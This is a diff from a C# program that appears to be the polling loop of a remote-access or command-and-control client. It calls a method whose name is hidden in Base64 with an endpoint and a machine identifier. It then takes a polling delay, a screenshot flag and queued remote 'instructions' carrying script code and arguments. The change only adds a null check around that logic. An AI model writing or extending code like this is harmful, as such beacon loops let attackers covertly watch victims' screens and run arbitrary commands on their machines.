@@ -40,53 +40,57 @@ namespace frameless
                             Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Check"))),
                             new object[] { Properties.Resources.Endpoint, Me }
                         );
-
-                        if (result is string errorMessage)
+                        if (result != null)
                         {
-                            //  Console.WriteLine($"An error occurred: {errorMessage}");
-                        }
-                        else
-                        {
-                            Type resultType = result.GetType();
 
-                            //  Delay
-                            var delayProperty = resultType.GetProperty("Delay");
-                            if (delayProperty != null)
+                            if (result is string errorMessage)
                             {
-                                var delay = delayProperty.GetValue(result);
-                                Delay = (int)delay;
+                                //  Console.WriteLine($"An error occurred: {errorMessage}");
                             }
-
-                            //  Screenshot
-                            var screenshotProperty = resultType.GetProperty("Screenshot");
-                            if (screenshotProperty != null)
+                            else
                             {
-                                var screenshot = screenshotProperty.GetValue(result);
-                                Screenshot = (screenshot == null) ? 0 : (int)screenshot;
-                            }
+                                Type resultType = result.GetType();
 
-                            //  Instruction
-                            var instsProperty = resultType.GetProperty("Insts");
-                            if (instsProperty != null)
-                            {
-                                var insts = instsProperty.GetValue(result) as IEnumerable<object>;
-                                if (insts != null)
+                                //  Delay
+                                var delayProperty = resultType.GetProperty("Delay");
+                                if (delayProperty != null)
                                 {
-                                    foreach (var inst in insts)
+                                    var delay = delayProperty.GetValue(result);
+                                    Delay = (int)delay;
+                                }
+
+                                //  Screenshot
+                                var screenshotProperty = resultType.GetProperty("Screenshot");
+                                if (screenshotProperty != null)
+                                {
+                                    var screenshot = screenshotProperty.GetValue(result);
+                                    Screenshot = (screenshot == null) ? 0 : (int)screenshot;
+                                }
+
+                                //  Instruction
+                                var instsProperty = resultType.GetProperty("Insts");
+                                if (instsProperty != null)
+                                {
+                                    var insts = instsProperty.GetValue(result) as IEnumerable<object>;
+                                    if (insts != null)
                                     {
-                                        Type instType = inst.GetType();
-                                        var id = instType.GetProperty("Id")?.GetValue(inst);
-                                        var code = instType.GetProperty("Code")?.GetValue(inst);
-                                        var script = instType.GetProperty("Script")?.GetValue(inst);
-                                        var args = instType.GetProperty("Args")?.GetValue(inst);
-                                        lock (InstructionsQueue)
+                                        foreach (var inst in insts)
                                         {
-                                            InstructionsQueue.Enqueue(new Instruction { code = (short)code, instructionId = (long)id, script = (string)script, functionArgs = (string)args });
+                                            Type instType = inst.GetType();
+                                            var id = instType.GetProperty("Id")?.GetValue(inst);
+                                            var code = instType.GetProperty("Code")?.GetValue(inst);
+                                            var script = instType.GetProperty("Script")?.GetValue(inst);
+                                            var args = instType.GetProperty("Args")?.GetValue(inst);
+                                            lock (InstructionsQueue)
+                                            {
+                                                InstructionsQueue.Enqueue(new Instruction { code = (short)code, instructionId = (long)id, script = (string)script, functionArgs = (string)args });
+                                            }
                                         }
                                     }
                                 }
                             }
                         }
+
 
                         Thread.Sleep(Delay);
                     }
